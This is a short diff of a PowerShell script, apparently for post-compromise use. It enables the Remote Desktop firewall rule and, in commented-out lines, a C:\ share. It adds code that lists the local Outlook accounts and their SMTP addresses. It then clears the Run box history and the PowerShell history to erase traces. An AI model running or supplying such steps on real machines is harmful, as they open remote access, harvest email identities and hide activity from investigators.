@@ -210,11 +210,13 @@ netsh advfirewall firewall set rule group='remote desktop' new enable=Yes
 #$Share.Create('C:\', 'netShare', 0)
 #netsh advfirewall firewall set rule group=\"File and Printer Sharing\" new enable=Yes
 
-
+### Get local Email config from Outlook | Not Finish to complete |
+$outlookApplication = New-Object -ComObject 'Outlook.Application'
+$accounts = $outlookApplication.Session.Accounts
+$accounts | Select DisplayName, SmtpAddress
 
 # Delete run box history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
 # Delete powershell history
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
